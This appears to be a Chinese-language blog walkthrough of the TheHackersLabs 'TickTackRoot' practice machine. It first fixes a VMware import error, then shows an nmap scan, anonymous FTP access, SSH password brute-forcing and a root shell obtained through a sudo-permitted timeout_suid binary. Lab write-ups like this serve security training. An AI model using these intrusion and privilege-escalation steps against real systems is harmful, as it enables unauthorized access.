---
title: "晚间沙龙：TickTackRoot-WP"
date: 2025-07-23
categories: [learn,wp,随笔]
tags: [learn,thehackerlabs_wp]
---

## TickTackRoot-WP

开始只前聊下导入靶机遇到的问题：Capacity mismatch for disk E:\Network\Vm\\ticktack-disk1.vmdk

查了原因是 `.vmdk` 描述文件和 `.ovf` 中定义的容量不一致，尤其是在 **VirtualBox 转换到 VMware** 的 OVA 文件中常见。

OVA 文件解压后通常包含：
- `.ovf`：虚拟机描述文件
- `.vmdk`：虚拟磁盘文件
- `.mf`：记录前两个文件的哈希值（manifest）

**解决方案**：
1. 打开 `.vmdk` 文件，头部是文本，后面是二进制。
2. 找到 `XXXXXX SPARSE` 行，将数字 × 512 得到 VMDK 实际容量。
3. 修改 `.ovf` 中的 `ovf:capacity` 值。
4. 删除 `.mf` 文件，避免哈希校验错误。
5. 重新导入 VMware，成功。

## 

靶场不难，没太多说的。ssh爆破密码有些耗时

#### 信息收集

```shell
kali@kali:~$ sudo nmap -sT -p- 192.168.200.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-23 10:04 EDT
Nmap scan report for 192.168.200.164
Host is up (0.00035s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:78:A8:E3 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds

==
kali@kali:~$ sudo nmap -sT -sV -sC -p21,22,80 192.168.200.164
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           10671 Oct 03  2024 index.html
|_drwxr-xr-x    2 0        0            4096 Oct 07  2024 login
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

web只有个apache默认html，接着用ftp匿名连接

```shell
kali@kali:~$ ftp 192.168.200.164                          
Connected to 192.168.200.164                          
220 Bienvenido Robin                           
Name (192.168.200.164:kali): anonymous                    
331 Please specify the password.                                      
Password:                                      
230 Login successful.                                    
Remote system type is UNIX.                       
Using binary mode to transfer files.                                              
ftp 192.168.200.164
Name: anonymous
Password: [Enter]
ftp> ls
-rw-r--r--    1 0        0           10671 Oct 03  2024 index.html
drwxr-xr-x    2 0        0            4096 Oct 07  2024 login
ftp> cd login
ftp> ls
-rw-r--r--    1 0        0              14 Oct 07  2024 login.txt
ftp> get login.txt                    
```

#### 立足点

index.html和apache默认页面一样，login.txt有两个名字，可能是用户名，还有个ftp连接提示用户名Robin

web上找不到别的，ssh爆破，得到密码，ssh连接。

#### 提权

```shell
robin@TheHackersLabs-Ticktackroot:~$ id
uid=1001(robin) gid=1001(robin) groups=1001(robin),100(users)

robin@TheHackersLabs-Ticktackroot:~$ sudo -l
Matching Defaults entries for robin on TheHackersLabs-Ticktackroot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User robin may run the following commands on TheHackersLabs-Ticktackroot:
    (ALL) NOPASSWD: /usr/bin/timeout_suid

robin@TheHackersLabs-Ticktackroot:~$ file /usr/bin/timeout_suid
/usr/bin/timeout_suid: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=112624bae285633e0ce13533cfdc25b36522ca89, for GNU/Linux 3.2.0, stripped

robin@TheHackersLabs-Ticktackroot:~$ /usr/bin/timeout_suid
Try '/usr/bin/timeout_suid --help' for more information.

robin@TheHackersLabs-Ticktackroot:~$ /usr/bin/timeout_suid --help
Usage: /usr/bin/timeout_suid [OPTION] DURATION COMMAND [ARG]...
  or:  /usr/bin/timeout_suid [OPTION]
Start COMMAND, and kill it if still running after DURATION.

Mandatory arguments to long options are mandatory for short options too.
      --preserve-status
                 exit with the same status as COMMAND, even when the
                   command times out
      --foreground
                 when not running timeout directly from a shell prompt,
                   allow COMMAND to read from the TTY and get TTY signals;
                   in this mode, children of COMMAND will not be timed out
  -k, --kill-after=DURATION
                 also send a KILL signal if COMMAND is still running
                   this long after the initial signal was sent
  -s, --signal=SIGNAL
                 specify the signal to be sent on timeout;
                   SIGNAL may be a name like 'HUP' or a number;
                   see 'kill -l' for a list of signals
  -v, --verbose  diagnose to stderr any signal sent upon timeout
      --help        display this help and exit
      --version     output version information and exit

DURATION is a floating point number with an optional suffix:
's' for seconds (the default), 'm' for minutes, 'h' for hours or 'd' for days.
A duration of 0 disables the associated timeout.

Upon timeout, send the TERM signal to COMMAND, if no other SIGNAL specified.
The TERM signal kills any process that does not block or catch that signal.
It may be necessary to use the KILL signal, since this signal can't be caught.

Exit status:
  124  if COMMAND times out, and --preserve-status is not specified
  125  if the timeout command itself fails
  126  if COMMAND is found but cannot be invoked
  127  if COMMAND cannot be found
  137  if COMMAND (or timeout itself) is sent the KILL (9) signal (128+9)
  -    the exit status of COMMAND otherwise

GNU coreutils online help:
Report any translation bugs to
Full documentation
or available locally via: info '(coreutils) timeout invocation'

robin@TheHackersLabs-Ticktackroot:~$ sudo /usr/bin/timeout_suid /bin/bash
Try '/usr/bin/timeout_suid --help' for more information.

robin@TheHackersLabs-Ticktackroot:~$ sudo /usr/bin/timeout_suid 10s /bin/bash
root@TheHackersLabs-Ticktackroot:/home/robin# whoami
root

```

​    有个程序(ALL) NOPASSWD: /usr/bin/timeout_suid  

​	查看help，执行指定命令，并在指定时间(DURATION)后终止该命令，随便输入个时间，/bin/bash提权

​	`sudo /usr/bin/timeout_suid 10s /bin/bash` 

